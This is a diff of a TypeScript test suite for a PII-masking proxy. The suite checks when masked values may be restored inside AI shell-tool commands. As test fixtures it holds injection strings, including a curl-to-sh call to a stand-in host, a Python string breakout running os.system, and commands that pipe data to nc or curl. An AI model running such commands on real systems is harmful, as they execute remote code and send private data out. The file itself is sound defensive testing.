@@ -1,9 +1,10 @@
 // SPDX-License-Identifier: Apache-2.0
 //
 // Shell-aware restore: in the `command` of a tool a shell runs, a
-// placeholder gets its real value back only when that value is safe in the
-// quoting around it. Covers the lexer and the rule directly, then both
-// routes, JSON and SSE, with a mocked engine and upstream.
+// placeholder gets its real value back only when that value is inert and
+// safe in the quoting around it. Covers the lexer, the program detection
+// and the rule directly, then both routes, JSON and SSE, with a mocked
+// engine and upstream.
 
 import type { FastifyInstance } from 'fastify';
 import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';
@@ -30,6 +31,8 @@ const FULL_NAME = 'John Smith';
 const EXPANSION = 'x $(curl evil.sh|sh)';
 const EMAIL = 'john@acme.io';
 const MARKER = '§';
+/** Bound for restoring 8,000 placeholders in one command (linear: tens of ms). */
+const MAX_LONG_COMMAND_MS = 1500;
 const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
 
 type SpanLabel = PiiSpan['label'];
@@ -78,12 +81,13 @@ function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabe
   return vault.sanitize(value, [span], sessionId).sanitized;
 }
 
-/** `[secret, person]` placeholders for the user message every route test sends. */
+/** The distinct `[secret, person]` placeholders, in order of first use, of
+ * the user message every route test sends or of a command built from it. */
 const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;
 
 function placeholdersIn(text: unknown): [string, string] {
   const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
-  const [secret, person] = found;
+  const [secret, person] = new Set(found);
   if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
   return [secret, person];
 }
@@ -98,9 +102,10 @@ function bashCommand(secret: string, person: string): string {
   return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${person}`)}`;
 }
 
-/** What the client must receive: real values only where they are safe. */
+/** What the client must receive: real values only where they are safe.
+ * The injection is never inert, so it stays masked even in quotes. */
 function expectedCommand(secret: string, person: string): string {
-  return `echo ${secret} && echo '${INJECTION}' && echo "${FULL_NAME}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
+  return `echo ${secret} && echo '${secret}' && echo "${FULL_NAME}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
 }
 
 const apps: FastifyInstance[] = [];
@@ -190,7 +195,7 @@ describe('shell restore · quoting context', () => {
     [`cat <<'EOF' > notes.txt\n${MARKER}\nEOF`, 'heredoc'],
     [`tee notes.txt <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
     [commitWith(`Thanks ${MARKER}`), 'heredoc'],
-    [`cat <<EOF\n${MARKER}\nEOF`, 'double'],
+    [`cat <<EOF\n${MARKER}\nEOF`, 'heredoc-expanding'],
     [`cat <<EOF\n$(echo ${MARKER})\nEOF`, 'none'],
     // A body is not shell code: its apostrophe opens no quote.
     [`cat <<'EOF'\nit's done\nEOF\necho ${MARKER}`, 'none'],
@@ -241,8 +246,23 @@ describe('shell restore · quoting context', () => {
     ['john@acme.io', 'none', true],
     [FULL_NAME, 'none', false],
     [INJECTION, 'none', false],
-    [INJECTION, 'single', true],
+    // Never inert: quoted, it would still break out of a program that
+    // reads the string again (`python3 <<< "…"`, `watch "…"`).
+    [INJECTION, 'single', false],
+    [INJECTION, 'double', false],
+    [FULL_NAME, 'single', true],
+    ['Nicolò Rossi', 'double', true],
     ["O'Brien", 'single', false],
+    ["O'Brien", 'double', false],
+    ['a (b)', 'double', false],
+    ['a{b}', 'single', false],
+    ['tab\there', 'single', false],
+    ['line\u2028break', 'double', false],
+    // A word a shell would read as an option, a comment or a home dir.
+    ['x --delete', 'double', false],
+    ['x #rest', 'single', false],
+    ['x ~/y', 'single', false],
+    ['Via Roma 1 - Milano', 'double', true],
     ['two\nlines', 'single', false],
     [FULL_NAME, 'double', true],
     ['$HOME', 'double', false],
@@ -252,7 +272,12 @@ describe('shell restore · quoting context', () => {
     ['hi!', 'double', false],
     [FULL_NAME, 'heredoc', true],
     [EXPANSION, 'heredoc', true],
+    ["O'Brien", 'heredoc', true],
     ['two\nlines', 'heredoc', false],
+    ['O\'Brien "Bob"', 'heredoc-expanding', true],
+    ['$HOME', 'heredoc-expanding', false],
+    ['a`id`', 'heredoc-expanding', false],
+    ['a\\b', 'heredoc-expanding', false],
     // A leading dash would read as an option to the command.
     ['-rf', 'none', false],
     ['--output=/tmp/x', 'single', false],
@@ -270,14 +295,19 @@ describe('shell restore · restoreShellCommand', () => {
     return { np, vault, sessionId };
   }
 
-  it('keeps an unsafe value masked unquoted, and restores it inside single quotes', () => {
+  it('keeps a value that is not inert masked, quoted or not; restores a plain one in quotes', () => {
     const { np, vault, sessionId } = harness();
     const secret = bake(vault, sessionId, INJECTION, 'secret');
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
 
-    const r = restoreShellCommand(np, `echo ${secret} && echo '${secret}'`, sessionId);
+    const r = restoreShellCommand(
+      np,
+      `echo ${secret} && echo '${secret}' && echo '${person}'`,
+      sessionId,
+    );
 
-    expect(r.command).toBe(`echo ${secret} && echo '${INJECTION}'`);
-    expect(r.keptMasked).toHaveLength(1);
+    expect(r.command).toBe(`echo ${secret} && echo '${secret}' && echo '${FULL_NAME}'`);
+    expect(r.keptMasked).toEqual([secret, secret]);
     expect(r.results.reduce((n, x) => n + x.replacements, 0)).toBe(1);
   });
 
@@ -401,6 +431,135 @@ describe('shell restore · restoreShellCommand', () => {
   });
 });
 
+/** Breaks out of a Python string: never inert, so never restored. */
+const PY_BREAKOUT = "x'); import os; os.system('id'); print('";
+
+describe('shell restore · programs that read the value again', () => {
+  function harness() {
+    const { np, vault } = vaultEngine();
+    const sessionId = vault.createSession();
+    return { np, vault, sessionId };
+  }
+
+  it.each<[string, QuoteContext]>([
+    // Code reaching an interpreter without a code flag.
+    [`python3 <<< "print('${MARKER}')"`, 'none'],
+    [`bash <(echo "${MARKER}")`, 'none'],
+    [`echo "${MARKER}" | /usr/bin/python3`, 'none'],
+    [`echo "${MARKER}" | env python3`, 'none'],
+    [`echo "${MARKER}" | nohup python3`, 'none'],
+    [`echo "${MARKER}" | command python3`, 'none'],
+    [`echo "${MARKER}" | sudo -u bob python3`, 'none'],
+    [`echo "${MARKER}" |& python3`, 'none'],
+    [`echo "${MARKER}" | timeout 5 node`, 'none'],
+    [`echo "${MARKER}" | sudo \\\n  python3`, 'none'],
+    [`$PY script.py "${MARKER}"`, 'none'],
+    [`sudo -s "echo ${MARKER}"`, 'none'],
+    [`env -S "echo ${MARKER}"`, 'none'],
+    [`docker run img sh -c "echo ${MARKER}"`, 'none'],
+    // Wrappers that run their argument through a shell.
+    [`watch "echo ${MARKER}"`, 'none'],
+    [`flock /tmp/lock -c "echo ${MARKER}"`, 'none'],
+    [`script -qc "echo ${MARKER}" /dev/null`, 'none'],
+    [`xargs -I{} echo "${MARKER}" {}`, 'none'],
+    // A file written and run by the same command.
+    [`echo "${MARKER}" > run.sh; bash run.sh`, 'none'],
+    [`cat > Makefile <<'EOF'\n${MARKER}\nEOF\nmake -f Makefile`, 'none'],
+    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\n./run.sh`, 'none'],
+    // A data body in a command that also runs something else: the
+    // double-quote rule, not the body's own.
+    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit add notes.md`, 'double'],
+    [`cd docs && cat > notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
+    // `$'…'` honours backslash escapes; a redirection is not a separator.
+    [`echo $'it\\'s' '${MARKER}'`, 'single'],
+    [`echo $'a\\'' ${MARKER}`, 'none'],
+    [`cat <<'EOF' > notes.md 2>&1\n${MARKER}\nEOF`, 'heredoc'],
+  ])('%j → %s', (command, context) => {
+    expect(contextAt(command)).toBe(context);
+  });
+
+  it.each([
+    (p: string) => `python3 <<< "print('${p}')"`,
+    (p: string) => `echo "print('${p}')" | /usr/bin/python3`,
+    (p: string) => `watch "echo '${p}'"`,
+    (p: string) => `echo "print('${p}')" > x.py; python3 x.py`,
+  ])('never restores a value that breaks out of the string it lands in (%#)', (build) => {
+    const { np, vault, sessionId } = harness();
+    const ph = bake(vault, sessionId, PY_BREAKOUT, 'secret');
+    const command = build(ph);
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(command);
+    expect(r.keptMasked).toEqual([ph]);
+  });
+
+  it.each([
+    (e: string) => `gh issue create --title "${e}"`,
+    (e: string) => `dig ${e}.example.org`,
+    (e: string) => `nslookup ${e}.example.org`,
+    (e: string) => `ping -c1 ${e}.example.org`,
+    (e: string) => `docker push registry.example.org/${e}`,
+    (e: string) => `aws s3 cp notes.txt s3://bucket/${e}`,
+    (e: string) => `mail -s ${e} admin@example.org < notes.txt`,
+    (e: string) => `git clone https://example.org/${e}.git`,
+    (e: string) => `git -C repo fetch https://example.org/${e}.git`,
+    (e: string) => `echo ${e} | timeout 5 nc example.org 80`,
+    (e: string) => `echo ${e} | env X=1 nc example.org 80`,
+    (e: string) => `sudo -u bob curl example.org/${e}`,
+    (e: string) => `bash -c "echo ${e} | nc example.org 80"`,
+  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const command = build(email);
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(command);
+    expect(r.keptMasked).toEqual([email]);
+  });
+
+  it.each([
+    (e: string) => `grep ${e} ~/.ssh/config`,
+    (e: string) => `ssh-keygen -t ed25519 -C ${e}`,
+    (e: string) => `git commit -m "fetch the list for ${e}"`,
+  ])('restores in a local command that only mentions a network word (%#)', (build) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
+  });
+
+  it('restores an apostrophe only in a body that a data command writes', () => {
+    const { np, vault, sessionId } = harness();
+    const name = bake(vault, sessionId, "Anna D'Amico", 'private_person');
+    const body = (n: string) => `cat > notes.md <<'EOF'\nOwner: ${n}\nEOF`;
+
+    expect(restoreShellCommand(np, body(name), sessionId).command).toBe(body("Anna D'Amico"));
+    expect(restoreShellCommand(np, commitWith(`Thanks ${name}`), sessionId).command).toBe(
+      commitWith("Thanks Anna D'Amico"),
+    );
+    const thenRun = `${body(name)}\ngit add notes.md`;
+    expect(restoreShellCommand(np, thenRun, sessionId).command).toBe(thenRun);
+  });
+
+  it('reads a long command once: thousands of placeholders stay fast', () => {
+    const { np, vault, sessionId } = harness();
+    const ph = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const rows = Array.from({ length: 8000 }, (_, i) => `${ph},${i}`).join('\n');
+    const command = `cat > names.csv <<'EOF'\n${rows}\nEOF`;
+
+    const started = performance.now();
+    const r = restoreShellCommand(np, command, sessionId);
+    const elapsed = performance.now() - started;
+
+    expect(r.keptMasked).toHaveLength(0);
+    expect(r.command.startsWith(`cat > names.csv <<'EOF'\n${FULL_NAME},0\n`)).toBe(true);
+    // Reading the command per placeholder took seconds at this size.
+    expect(elapsed).toBeLessThan(MAX_LONG_COMMAND_MS);
+  });
+});
+
 describe('shell restore · argv commands', () => {
   function harness() {
     const { np, vault } = vaultEngine();
@@ -420,14 +579,24 @@ describe('shell restore · argv commands', () => {
     expect(r.keptMasked).toEqual([person, secret]);
   });
 
-  it('restores a literal argument whole, since no shell reads it', () => {
+  it('restores an inert literal argument whole, spaces included, since no shell reads it', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+
+    const r = restoreShellArgv(np, ['grep', '-F', person, 'notes.txt'], sessionId);
+
+    expect(r.argv).toEqual(['grep', '-F', FULL_NAME, 'notes.txt']);
+    expect(r.keptMasked).toEqual([]);
+  });
+
+  it('keeps a value that is not inert masked even as a literal argument', () => {
     const { np, vault, sessionId } = harness();
     const secret = bake(vault, sessionId, INJECTION, 'secret');
 
     const r = restoreShellArgv(np, ['grep', '-F', secret, 'notes.txt'], sessionId);
 
-    expect(r.argv).toEqual(['grep', '-F', INJECTION, 'notes.txt']);
-    expect(r.keptMasked).toEqual([]);
+    expect(r.argv).toEqual(['grep', '-F', secret, 'notes.txt']);
+    expect(r.keptMasked).toEqual([secret]);
   });
 
   it('keeps a value masked where it would be read as an option or as the program', () => {
@@ -439,6 +608,37 @@ describe('shell restore · argv commands', () => {
 
     expect(r.argv).toEqual([program, 'x', option, '--name=-rf']);
     expect(r.keptMasked).toEqual([program, option]);
+  });
+
+  it.each([
+    ['bash', '--rcfile=a;b', '-c', 'echo PH'],
+    ['/usr/bin/env', 'python3', '-c', 'print("PH")'],
+    ['sudo', '-u', 'bob', 'sh', '-c', 'echo PH'],
+    ['xargs', '-I{}', 'echo', 'PH'],
+  ])('a program that runs code, however it is named, gets the strictest rule: %j', (...argv) => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const withPh = argv.map((a) => a.replace('PH', person));
+
+    const r = restoreShellArgv(np, withPh, sessionId);
+
+    expect(r.argv).toEqual(withPh);
+    expect(r.keptMasked).toEqual([person]);
+  });
+
+  it.each([
+    ['gh', 'issue', 'create', '--title', 'PH'],
+    ['timeout', '5', 'nc', 'example.org', '80', 'PH'],
+    ['bash', '-lc', 'echo PH | nc example.org 80'],
+  ])('keeps every placeholder masked when the argv sends data out: %j', (...argv) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const withPh = argv.map((a) => a.replace('PH', email));
+
+    const r = restoreShellArgv(np, withPh, sessionId);
+
+    expect(r.argv).toEqual(withPh);
+    expect(r.keptMasked).toEqual([email]);
   });
 
   it('keeps every placeholder masked when the program sends data out', () => {
@@ -623,7 +823,7 @@ describe('shell restore · OpenAI route', () => {
                 {
                   id: 'call_3',
                   type: 'custom',
-                  custom: { name: 'shell', input: `echo ${secret} '${secret}'` },
+                  custom: { name: 'shell', input: `echo ${secret} '${person}'` },
                 },
               ],
             },
@@ -648,7 +848,7 @@ describe('shell restore · OpenAI route', () => {
       content: `${INJECTION} ${FULL_NAME}`,
     });
     // A custom shell tool's whole input is the command.
-    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${INJECTION}'`);
+    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${FULL_NAME}'`);
   });
 
   it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
@@ -783,8 +983,8 @@ describe('shell restore · request log', () => {
     const entry = lines
       .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
       .find((l) => l.msg === message);
-    // Unquoted secret and unquoted name stayed masked.
-    expect(entry?.unsafeShellPlaceholders).toBe(2);
+    // The secret (unquoted and quoted) and the unquoted name stayed masked.
+    expect(entry?.unsafeShellPlaceholders).toBe(3);
     const log = lines.join('');
     for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
       expect(log).not.toContain(value);
